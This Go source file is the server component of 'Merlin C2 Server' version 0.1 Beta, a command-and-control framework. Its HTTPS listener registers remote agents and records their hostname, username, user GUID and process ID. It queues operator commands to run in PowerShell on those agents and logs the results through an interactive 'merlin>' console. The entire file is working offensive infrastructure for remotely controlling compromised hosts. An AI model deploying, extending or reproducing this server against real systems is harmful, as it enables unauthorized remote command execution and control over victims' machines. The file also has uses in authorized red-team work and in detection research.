package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
	"./lib/standard/messages"
	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"flag"
	"./lib/standard/banner"
	"math/rand"
	//"github.com/mattn/go-sqlite3"
	//"database/sql"
	"encoding/base64"
	"strings"
	"path/filepath"
	//"crypto/x509"
	//"text/template/parse"
	"strconv"
)

//Global Variables
var DEBUG = false
var VERBOSE = true
var src = rand.NewSource(time.Now().UnixNano())
const merlinVersion = "0.1 Beta"
const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
const (
    letterIdxBits = 6                    // 6 bits to represent a letter index
    letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
    letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
)
var currentDir, _ = os.Getwd()
var agents = make(map[uuid.UUID]*agent) //global map to house agent objects

func main() {

	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
	port := flag.Int("p", 443, "Merlin Server Port")
	ip := flag.String("i", "0.0.0.0", "The IP address of the interface to bind to")
	crt := flag.String("x509cert", filepath.Join(string(currentDir), "data/x509/server.crt"), "The x509 certificate for the HTTPS listener")
	key := flag.String("x509key", filepath.Join(string(currentDir), "data/x509/server.key"), "The x509 certificate key for the HTTPS listener")
	flag.Parse()

	color.Blue(banner.Banner1)
	color.Blue("\t\t   Version: %s", merlinVersion)

	//Database Connection
	//db, _ := sql.Open("sqlite3", string(currentDir) + "/data/db/foo.db")

	//time.Sleep(300 * time.Millisecond)

	go startListener(strconv.Itoa(*port), *ip, *crt, *key, "/")
	shell ()
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	if VERBOSE {
		color.Yellow("[-]Recieved HTTP %s Connection from %s", r.Method, r.Host)
	}

	if r.Method == "POST" {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(r.Body).Decode(&j)

		if DEBUG {
			color.Red("[DEBUG]POST DATA: %s", j)
		}
		switch j.Type {
		case "InitialCheckIn":
			var p messages.SysInfo
			json.Unmarshal(payload, &p)
			agentInitialCheckIn(j, p)
		case "StatusCheckIn":
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(statusCheckIn(j))
		case "PSResults":
			//TODO move to its own function
			var p messages.PSResults
			json.Unmarshal(payload, &p)
			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results for job: %s\r\n",time.Now(), p.Job))
			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results:\r\n%s\r\n",time.Now(), p.Result))
			color.Green("[+]Results for job %s", p.Job)
			color.Green("%s", p.Result)
			fmt.Printf("merlin>")
		default:
			color.Red("[!]Invalid Activity: %s", j.Type)
			fmt.Printf("merlin>")
		}

	} else if r.Method == "GET" {
		g := messages.Base{ID: uuid.NewV4(), Type: "TEST"}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(g)
	}
}

func startListener(port string, ip string, crt string, key string, webpath string) {

	//Check to make sure files exist
	_, err_crt := os.Stat(crt)
	if err_crt != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 certificate")
		fmt.Println(err_crt)
		fmt.Printf("merlin>")
		return
	}

	_, err_key := os.Stat(key)
	if err_key != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key")
		fmt.Println(err_key)
		fmt.Printf("merlin>")
		return
	}

	cer, err := tls.LoadX509KeyPair(crt, key)

	if err != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key pair")
		color.Red("[!]Ensure a keypair is located in the data/x509 directory")
		fmt.Println(err)
		fmt.Printf("merlin>")
		return
	}

	//Configure TLS
	config := &tls.Config{
		Certificates: []tls.Certificate{cer},
		//NextProtos: []string{"h2"},
	}
	http.HandleFunc(webpath, httpHandler)

	s := &http.Server{
		Addr:           ip + ":" + port,
		Handler:        nil,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
		TLSConfig:      config,
	}

	//I shouldn't need to specify the certs as they are in the config
	color.Yellow("[-]HTTPS Listener Started on %s:%s", ip, port)
	fmt.Printf("merlin>")
	go log.Fatal(s.ListenAndServeTLS(crt, key))
	// TODO determine scripts path and load certs by their absolute path
}

func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
	color.Green("[+]Recieved new agent checkin from %s", j.ID)
	if VERBOSE {
		color.Yellow("\t[i]Host ID: %s", j.ID)
		color.Yellow("\t[i]Activity: %s", j.Type)
		color.Yellow("\t[i]Payload: %s", j.Payload)
		color.Yellow("\t[i]Username: %s", p.UserName)
	}
	agentsDir := filepath.Join(currentDir, "agents")

	if _, d_err := os.Stat(agentsDir); os.IsNotExist(d_err) {
		os.Mkdir(agentsDir, os.ModeDir)
	}
	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(agentsDir, j.ID.String()), os.ModeDir)
		os.Create(filepath.Join(agentsDir, j.ID.String(),"agent_log.txt"))

		if VERBOSE{
			color.Yellow("[-]Created agent log file at: %s", agentsDir, j.ID.String(),"agent_log.txt")
		}
	}

	f, err := os.OpenFile(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
    		panic(err)
	}
	// Add custom agent struct to global agents map
	agents[j.ID]=&agent{id: j.ID, userName: p.UserName, userGUID: p.UserGUID,
		           hostName: p.HostName, pid: p.Pid, channel: make(chan []string, 10),
		           agentLog: f, iCheckIn: time.Now(), sCheckIn: time.Now()}

	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent initial check in for agent %s\r\n",time.Now(), j.ID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), p.HostName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), p.UserName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), p.Pid))

	fmt.Printf("merlin>")
	//Add code here to create db record
}

func statusCheckIn(j messages.Base) messages.Base {
	if VERBOSE {
		color.Green("[+]Recieved agent status checkin from %s", j.ID)
	}
	if DEBUG{
		color.Red("[DEBUG]Channel length: %d", len(agents[j.ID].channel))
		color.Red("[DEBUG]Channel content: %s", agents[j.ID].channel)
	}

	agents[j.ID].sCheckIn = time.Now()
	if len(agents[j.ID].channel) >= 1 {
		command := <-agents[j.ID].channel
		jobID := RandStringBytesMaskImprSrc(10)
		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)

		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n",time.Now(), command[0]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n",time.Now(), command[1:]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Created job %s for agent %s\r\n",time.Now(), jobID, j.ID))

		fmt.Printf("merlin>")

		switch command[0]{
		case "agent_cmd":
			p := messages.CmdPayload{
			Command: strings.Join(command[2:], " "),
			Job: jobID,
			}

			k, _ := json.Marshal(p)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdPayload",
				Payload: (*json.RawMessage)(&k),
			}

			return g
		case "agent_control":
			p := messages.AgentControl{
			Command: command[2],
			Job: jobID,
			}

			k, _ := json.Marshal(p)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "AgentControl",
				Payload: (*json.RawMessage)(&k),
			}

			return g
		default:
			g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
			}
			return g
		}
	} else {
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
		}
		return g
	}

}

func usage () {
	color.Yellow("Merlin C2 Server (version %s)", merlinVersion)
	color.Yellow("agent_cmd <agent ID> <command>\t\tRun a command in PowerShell on an agent")
	color.Yellow("agent_control <agent ID> <command>\tKill the Merlin agent")
	color.White("\tValid commands: kill, ")
	color.Yellow("agent_info <agent ID>\t\t\t\tDisplay all agent information")
	color.Yellow("agent_list\t\t\t\tList agents")
	color.Yellow("exit\t\t\t\t\tKill Merlin server")
	color.Yellow("quit\t\t\t\t\tKill Merlin server")
}

func shell() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("merlin>")
		input_cmd, _ := reader.ReadString('\n')
		stripped_cmd := strings.TrimRight(input_cmd, "\r\n")
		cmd := strings.Split(stripped_cmd, " ")

		switch cmd[0] {
		case "exit":
			color.Red("[!]Quitting")
			os.Exit(1)
		case "quit":
			color.Red("[!]Quitting")
			os.Exit(1)
		case "?":
			usage()
		case "help":
			usage()
		case "agent_control":
			if len(cmd) == 3 {
				a, _ := uuid.FromString(cmd[1])
				s := agents[a].channel //https://github.com/golang/go/issues/3117
				s <- cmd
			}else {
				color.Red("[!]Invalid command")
				color.White("agent_control <agent ID> <command>")
			}
		case "agent_cmd":
			if len(cmd) >= 3 {
				a, _ := uuid.FromString(cmd[1])
				s := agents[a].channel //https://github.com/golang/go/issues/3117
				s <- cmd
				a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[1]))
				if DEBUG {
					color.Red("Input: %s", cmd[1])
					color.Red("Base64 Input: %s", a_cmd)
				}
			}else {
				color.Red("[!]Invalid command")
				color.White("agent_cmd <agent ID> <cmd>")
			}
		case "agent_list":
			color.Yellow("====================================================")
			color.Yellow("\t\tAgents List")
			color.Yellow("====================================================")
			color.Yellow("GUID\t\t\t\t\tUser\t\t\tHost")
			color.Yellow("====================================================")
			for k, v := range agents{
				color.Yellow("%s\t%s\t%s", k.String(), v.userName, v.hostName)
			}
		case "agent_info":
			if len(cmd) == 1 {
				color.Red("[!]Invalid command")
				color.White("agent_info <agent_id>")
			} else if len(cmd) >= 2 {
				a, _ := uuid.FromString(cmd[1])
				color.Yellow("ID : %s", agents[a].id.String())
				color.Yellow("UserName : %s", agents[a].userName)
				color.Yellow("User GUID : %s", agents[a].userGUID)
				color.Yellow("Hostname : %s", agents[a].hostName)
				color.Yellow("Process ID : %d", agents[a].pid)
				color.Yellow("Initial Check In: %s", agents[a].iCheckIn.String())
				color.Yellow("Last Check In: %s", agents[a].sCheckIn.String())
			}
		default:
			color.Red("[!]Invalid command: %s", cmd)
		}
	}
}

func RandStringBytesMaskImprSrc(n int) string {
	//http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
    b := make([]byte, n)
    // A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
    for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
        if remain == 0 {
            cache, remain = src.Int63(), letterIdxMax
        }
        if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
            b[i] = letterBytes[idx]
            i--
        }
        cache >>= letterIdxBits
        remain--
    }

    return string(b)
}

type agent struct {
	id		uuid.UUID
	userName	string
	userGUID	string
	hostName 	string
	pid 		int
	agentLog	*os.File
	channel		chan []string
	iCheckIn	time.Time
	sCheckIn	time.Time
}